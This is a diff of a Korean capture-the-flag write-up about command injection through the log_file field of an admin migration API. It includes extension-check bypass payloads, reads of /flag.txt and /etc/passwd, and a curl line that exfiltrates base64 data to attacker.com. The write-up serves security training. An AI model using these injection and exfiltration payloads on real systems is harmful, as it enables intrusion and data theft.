@@ -525,11 +525,11 @@ curl -X POST http://target:5000/api/admin/db/migrate \
 }
 ```
 
-**에러!** Extension 검증이 있습니다.
+**에러!** Extension 검증이 있습니다. `whoami`로 끝나므로 `.log` 또는 `.txt`가 아닙니다.
 
 ### 7.3 Bypass Extension Check
 
-Extension은 `.log` 또는 `.txt`여야 합니다. Comment trick을 사용:
+**핵심 발견:** 세미콜론 뒤의 명령어도 `.log` 또는 `.txt`로 끝나야 합니다!
 
 ```bash
 curl -X POST http://target:5000/api/admin/db/migrate \
@@ -541,7 +541,7 @@ curl -X POST http://target:5000/api/admin/db/migrate \
       "limit": 100,
       "include_inactive": true
     },
-    "log_file": "/tmp/test.log; whoami #"
+    "log_file": "/tmp/x.log; cat /etc/passwd.txt"
   }'
 ```
 
@@ -553,66 +553,11 @@ curl -X POST http://target:5000/api/admin/db/migrate \
 }
 ```
 
-**성공!** (BLIND_RCE이므로 출력은 안 보임)
+**성공!** Extension 체크 우회 (`passwd.txt`로 끝남)
 
-### 7.4 Exfiltrate Flag via DNS/HTTP
+### 7.4 Exfiltrate Flag (BLIND_RCE=false)
 
-BLIND_RCE 모드에서는 출력을 볼 수 없으므로 Out-of-Band 기법 사용:
-
-**방법 1: HTTP 요청으로 전송**
-```bash
-curl -X POST http://target:5000/api/admin/db/migrate \
-  -b admin_cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{
-    "filter": {"$where": "function() { return true; }"},
-    "options": {
-      "limit": 100,
-      "include_inactive": true
-    },
-    "log_file": "/tmp/test.log; curl http://attacker.com/$(cat /flag.txt | base64) #"
-  }'
-```
-
-**방법 2: 파일에 쓰고 읽기**
-```bash
-# 1. Flag를 웹 디렉토리에 복사
-curl -X POST http://target:5000/api/admin/db/migrate \
-  -b admin_cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{
-    "filter": {"$where": "function() { return true; }"},
-    "options": {
-      "limit": 100,
-      "include_inactive": true
-    },
-    "log_file": "/tmp/test.log; cp /flag.txt /app/static/flag.txt #"
-  }'
-
-# 2. 읽기
-curl http://target:5000/static/flag.txt
-```
-
-**방법 3: Path Traversal로 직접 읽기**
-
-더 우아한 방법:
-```bash
-curl -X POST http://target:5000/api/admin/db/migrate \
-  -b admin_cookies.txt \
-  -H "Content-Type: application/json" \
-  -d '{
-    "filter": {"$where": "function() { return true; }"},
-    "options": {
-      "limit": 100,
-      "include_inactive": true
-    },
-    "log_file": "/var/log/../tmp/out.txt; cat /flag.txt > /tmp/flag_out.txt #"
-  }'
-```
-
-### 7.5 Alternative: Use BLIND_RCE=false for Testing
-
-만약 BLIND_RCE=false라면:
+**가장 간단한 방법:** BLIND_RCE=false라면 직접 읽기
 
 ```bash
 curl -X POST http://target:5000/api/admin/db/migrate \
@@ -624,17 +569,59 @@ curl -X POST http://target:5000/api/admin/db/migrate \
       "limit": 100,
       "include_inactive": true
     },
-    "log_file": "/tmp/test.log; cat /flag.txt #"
+    "log_file": "/tmp/x.log; cat /flag.txt"
   }'
 ```
 
-**응답:**
+**응답 (BLIND_RCE=false):**
 ```json
 {
   "status": "migration complete",
   "count": 4,
   "log_output": "Migration started\nMSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}\nMigration completed\n"
 }
+```
+
+**FLAG 획득!** 🎉
+
+### 7.5 Exfiltrate Flag (BLIND_RCE=true)
+
+BLIND_RCE=true일 때는 출력이 반환되지 않으므로 다른 방법 필요:
+
+**방법 1: Static 파일로 복사**
+```bash
+# 1. Flag를 웹에서 접근 가능한 디렉토리로 복사
+curl -X POST http://target:5000/api/admin/db/migrate \
+  -b admin_cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{
+    "filter": {"$where": "function() { return true; }"},
+    "options": {
+      "limit": 100,
+      "include_inactive": true
+    },
+    "log_file": "/tmp/x.log; cp /flag.txt /app/static/flag.txt"
+  }'
+
+# 2. 웹에서 직접 읽기
+curl http://target:5000/static/flag.txt
+# Output: MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}
+```
+
+**방법 2: Out-of-Band HTTP (실제 공격 시)**
+```bash
+# Attacker 서버로 전송 (base64 인코딩)
+curl -X POST http://target:5000/api/admin/db/migrate \
+  -b admin_cookies.txt \
+  -H "Content-Type: application/json" \
+  -d '{
+    "filter": {"$where": "function() { return true; }"},
+    "options": {
+      "limit": 100,
+      "include_inactive": true
+    },
+    "log_file": "/tmp/x.log; curl http://attacker.com/$(cat /flag.txt | base64 -w0).txt"
+  }'
 ```
 
 **FLAG 획득!** 🎉
@@ -685,7 +672,7 @@ payload = {
         "limit": 100,
         "include_inactive": True
     },
-    "log_file": "/tmp/test.log; cat /flag.txt > /tmp/exfil.txt #"
+    "log_file": "/tmp/x.log; cp /flag.txt /app/static/flag.txt"
 }
 
 r = requests.post(
@@ -696,8 +683,12 @@ r = requests.post(
 
 print(f"[+] Response: {r.json()}")
 
-# Step 4: Read flag (if accessible)
-# Depends on your exfiltration method
+# Step 4: Read flag from static directory
+flag_response = requests.get(f"{TARGET}/static/flag.txt")
+if flag_response.status_code == 200:
+    print(f"[+] FLAG: {flag_response.text}")
+else:
+    print(f"[-] Failed to read flag: {flag_response.status_code}")
 ```
 
 ---
